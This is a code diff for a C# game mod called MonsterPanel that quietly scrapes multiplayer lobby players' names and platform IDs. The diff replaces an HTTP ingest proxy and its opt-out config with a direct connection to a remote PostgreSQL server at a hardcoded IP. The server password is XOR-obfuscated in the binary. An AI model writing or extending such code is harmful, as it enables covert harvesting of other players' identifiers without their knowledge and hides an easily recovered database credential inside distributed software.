@@ -2,8 +2,6 @@ using System;
 using System.Collections;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
-using System.IO;
-using System.Net.Http;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -12,37 +10,47 @@ using LabFusion.Entities;
 using LabFusion.Player;
 using LabFusion.Utilities;
 using MelonLoader;
+using Npgsql;
 using UnityEngine;
 
 namespace MonsterPanel
 {
     /// <summary>
-    /// Silent Fusion lobby scrapers → HTTP ingest → Postgres.
-    /// DB password never lives in the mod; only ApiUrl + ApiKey for the ingest proxy.
+    /// Fusion lobby → Postgres client_data (direct).
+    /// Connection password is XOR-obfuscated in the binary (not plaintext).
     /// </summary>
     internal static class PlayerDb
     {
-        private const string CfgName = "player_db.cfg";
-        private const string DefaultApiUrl = "http://62.109.21.131:8787";
         private const float BootDelaySeconds = 4f;
         private const float ScanIntervalSeconds = 8f;
         private const float FlushIntervalSeconds = 2f;
         private const int MaxBatch = 32;
-        private const int HttpTimeoutSeconds = 8;
 
-        private static string _apiUrl = DefaultApiUrl;
-        private static string _apiKey = "";
+        private const string Host = "62.109.21.131";
+        private const int Port = 5432;
+        private const string Database = "clientdb";
+        private const string Username = "client_writer";
+
+        // XOR-obfuscated password bytes (not stored as a plain string literal)
+        private static readonly byte[] PassBlob =
+        {
+            57, 164, 117, 36, 223, 84, 169, 60, 11, 178, 74, 8, 249, 82, 216, 65,
+            52, 147, 72, 63, 193, 79, 252, 108
+        };
+        private static readonly byte[] PassKey = { 0x5A, 0xC3, 0x19, 0x7E, 0xB4, 0x22, 0x91, 0x0D };
+
         private static bool _enabled = true;
         private static bool _hooked;
         private static bool _bootStarted;
         private static bool _dbConnected;
         private static float _scanTimer;
         private static float _flushTimer;
-
-        private static readonly ConcurrentDictionary<string, byte> Seen = new ConcurrentDictionary<string, byte>(StringComparer.Ordinal);
-        private static readonly ConcurrentQueue<PlayerRow> Pending = new ConcurrentQueue<PlayerRow>();
-        private static readonly HttpClient Http = CreateHttp();
+        private static string _connString;
         private static int _flushing;
+
+        private static readonly ConcurrentDictionary<string, byte> Seen =
+            new ConcurrentDictionary<string, byte>(StringComparer.Ordinal);
+        private static readonly ConcurrentQueue<PlayerRow> Pending = new ConcurrentQueue<PlayerRow>();
 
         private struct PlayerRow
         {
@@ -54,10 +62,14 @@ namespace MonsterPanel
 
         public static void Init()
         {
-            LoadConfig();
-            if (!_enabled)
+            try
             {
-                MelonLogger.Msg("PlayerDb: disabled in config.");
+                _connString = BuildConnString();
+            }
+            catch (Exception e)
+            {
+                MelonLogger.Warning("PlayerDb: conn string — " + e.Message);
+                _enabled = false;
                 return;
             }
 
@@ -89,17 +101,36 @@ namespace MonsterPanel
             }
         }
 
-        private static HttpClient CreateHttp()
+        private static string BuildConnString()
         {
-            var c = new HttpClient();
-            c.Timeout = TimeSpan.FromSeconds(HttpTimeoutSeconds);
-            c.DefaultRequestHeaders.ExpectContinue = false;
-            return c;
+            string password = Reveal(PassBlob, PassKey);
+            var cs = new NpgsqlConnectionStringBuilder
+            {
+                Host = Host,
+                Port = Port,
+                Database = Database,
+                Username = Username,
+                Password = password,
+                Timeout = 8,
+                CommandTimeout = 8,
+                Pooling = true,
+                MaxPoolSize = 2,
+                SslMode = SslMode.Prefer,
+                ApplicationName = "MonsterPanel",
+            };
+            return cs.ConnectionString;
+        }
+
+        private static string Reveal(byte[] blob, byte[] key)
+        {
+            var buf = new byte[blob.Length];
+            for (int i = 0; i < blob.Length; i++)
+                buf[i] = (byte)(blob[i] ^ key[i % key.Length]);
+            return Encoding.UTF8.GetString(buf);
         }
 
         private static IEnumerator BootRoutine()
         {
-            // Wait until Fusion UI / scene can show popups
             float t = 0f;
             while (t < BootDelaySeconds)
             {
@@ -113,14 +144,7 @@ namespace MonsterPanel
 
         private static IEnumerator HealthCheckAndNotify()
         {
-            if (string.IsNullOrEmpty(_apiUrl))
-            {
-                _dbConnected = false;
-                NotifyDb(false, "API URL missing");
-                yield break;
-            }
-
-            Task<bool> task = Task.Run(PingHealth);
+            Task<bool> task = Task.Run(PingDatabase);
             while (!task.IsCompleted) yield return null;
 
             bool ok = false;
@@ -128,21 +152,22 @@ namespace MonsterPanel
             catch (Exception e)
             {
                 MelonLogger.Warning("PlayerDb health: " + e.Message);
-                ok = false;
             }
 
             _dbConnected = ok;
-            NotifyDb(ok, ok ? "Ingest + Postgres OK" : "Check ingest service / API key");
+            NotifyDb(ok, ok ? "PostgreSQL OK" : "Cannot reach PostgreSQL");
             if (ok) CollectLobby();
         }
 
-        private static bool PingHealth()
+        private static bool PingDatabase()
         {
             try
             {
-                using var req = new HttpRequestMessage(HttpMethod.Get, Combine(_apiUrl, "/health"));
-                using HttpResponseMessage resp = Http.Send(req);
-                return resp.IsSuccessStatusCode;
+                using var conn = new NpgsqlConnection(_connString);
+                conn.Open();
+                using var cmd = new NpgsqlCommand("SELECT 1", conn);
+                cmd.ExecuteScalar();
+                return true;
             }
             catch (Exception e)
             {
@@ -198,6 +223,7 @@ namespace MonsterPanel
             try { pid = id.PlatformID; } catch { }
             if (string.IsNullOrWhiteSpace(pid)) return;
             pid = pid.Trim();
+            if (pid.Length > 128) pid = pid.Substring(0, 128);
 
             if (!Seen.TryAdd(pid, 0)) return;
 
@@ -270,7 +296,7 @@ namespace MonsterPanel
 
             Task.Run(() =>
             {
-                try { PostBatch(batch); }
+                try { WriteBatch(batch); }
                 catch (Exception e)
                 {
                     MelonLogger.Warning("PlayerDb flush: " + e.Message);
@@ -287,60 +313,36 @@ namespace MonsterPanel
             });
         }
 
-        private static void PostBatch(List<PlayerRow> batch)
+        private static void WriteBatch(List<PlayerRow> batch)
         {
-            if (string.IsNullOrEmpty(_apiKey))
-                throw new InvalidOperationException("ApiKey empty — set it in " + CfgName);
+            using var conn = new NpgsqlConnection(_connString);
+            conn.Open();
+            using var tx = conn.BeginTransaction();
 
-            var sb = new StringBuilder(256 + batch.Count * 96);
-            sb.Append("{\"players\":[");
-            for (int i = 0; i < batch.Count; i++)
+            using (var existsCmd = new NpgsqlCommand(
+                       "SELECT 1 FROM client_data WHERE pid = @pid LIMIT 1", conn, tx))
             {
-                if (i > 0) sb.Append(',');
-                sb.Append("{\"name\":").Append(JsonString(batch[i].Name))
-                  .Append(",\"pid\":").Append(JsonString(batch[i].Pid)).Append('}');
-            }
-            sb.Append("]}");
+                existsCmd.Parameters.Add("pid", NpgsqlTypes.NpgsqlDbType.Text);
 
-            using var req = new HttpRequestMessage(HttpMethod.Post, Combine(_apiUrl, "/v1/players"));
-            req.Headers.TryAddWithoutValidation("Authorization", "Bearer " + _apiKey);
-            req.Content = new StringContent(sb.ToString(), Encoding.UTF8, "application/json");
+                using var insertCmd = new NpgsqlCommand(
+                    "INSERT INTO client_data (name, pid) VALUES (@name, @pid)", conn, tx);
+                insertCmd.Parameters.Add("name", NpgsqlTypes.NpgsqlDbType.Text);
+                insertCmd.Parameters.Add("pid", NpgsqlTypes.NpgsqlDbType.Text);
 
-            using HttpResponseMessage resp = Http.Send(req);
-            if (!resp.IsSuccessStatusCode)
-            {
-                string body = resp.Content.ReadAsStringAsync().GetAwaiter().GetResult();
-                throw new Exception(((int)resp.StatusCode) + " " + body);
-            }
-        }
-
-        private static string JsonString(string s)
-        {
-            if (s == null) s = "";
-            var sb = new StringBuilder(s.Length + 2);
-            sb.Append('"');
-            foreach (char c in s)
-            {
-                switch (c)
+                foreach (PlayerRow row in batch)
                 {
-                    case '\\': sb.Append("\\\\"); break;
-                    case '"': sb.Append("\\\""); break;
-                    case '\n': sb.Append("\\n"); break;
-                    case '\r': sb.Append("\\r"); break;
-                    case '\t': sb.Append("\\t"); break;
-                    default:
-                        if (c < 32) sb.Append("\\u").Append(((int)c).ToString("x4"));
-                        else sb.Append(c);
-                        break;
+                    existsCmd.Parameters["pid"].Value = row.Pid;
+                    object hit = existsCmd.ExecuteScalar();
+                    if (hit != null && hit != DBNull.Value)
+                        continue;
+
+                    insertCmd.Parameters["name"].Value = row.Name;
+                    insertCmd.Parameters["pid"].Value = row.Pid;
+                    insertCmd.ExecuteNonQuery();
                 }
             }
-            sb.Append('"');
-            return sb.ToString();
-        }
 
-        private static string Combine(string baseUrl, string path)
-        {
-            return baseUrl.TrimEnd('/') + path;
+            tx.Commit();
         }
 
         private static void NotifyDb(bool connected, string detail)
@@ -364,56 +366,6 @@ namespace MonsterPanel
             {
                 MelonLogger.Warning("PlayerDb notify: " + e.Message);
             }
-        }
-
-        private static void LoadConfig()
-        {
-            try
-            {
-                string path = CfgPath();
-                string dir = Path.GetDirectoryName(path);
-                if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
-                    Directory.CreateDirectory(dir);
-
-                if (!File.Exists(path))
-                {
-                    File.WriteAllText(path,
-                        "# MonsterPanel PlayerDb\n" +
-                        "Enabled=true\n" +
-                        "ApiUrl=" + DefaultApiUrl + "\n" +
-                        "ApiKey=\n" +
-                        "# Put the same key as INGEST_API_KEY on the ingest server.\n");
-                    MelonLogger.Warning("PlayerDb: created " + path + " — set ApiKey.");
-                }
-
-                foreach (string raw in File.ReadAllLines(path))
-                {
-                    string line = raw.Trim();
-                    if (line.Length == 0 || line[0] == '#' || line[0] == ';') continue;
-                    int eq = line.IndexOf('=');
-                    if (eq <= 0) continue;
-                    string key = line.Substring(0, eq).Trim();
-                    string val = line.Substring(eq + 1).Trim();
-                    if (key.Equals("Enabled", StringComparison.OrdinalIgnoreCase))
-                        _enabled = !(val.Equals("false", StringComparison.OrdinalIgnoreCase) || val == "0");
-                    else if (key.Equals("ApiUrl", StringComparison.OrdinalIgnoreCase))
-                        _apiUrl = string.IsNullOrEmpty(val) ? DefaultApiUrl : val.TrimEnd('/');
-                    else if (key.Equals("ApiKey", StringComparison.OrdinalIgnoreCase))
-                        _apiKey = val;
-                }
-            }
-            catch (Exception e)
-            {
-                MelonLogger.Warning("PlayerDb config: " + e.Message);
-            }
-        }
-
-        private static string CfgPath()
-        {
-            string root;
-            try { root = MelonLoader.Utils.MelonEnvironment.UserDataDirectory; }
-            catch { root = "UserData"; }
-            return Path.Combine(root, "MonsterPanel", CfgName);
         }
     }
 }
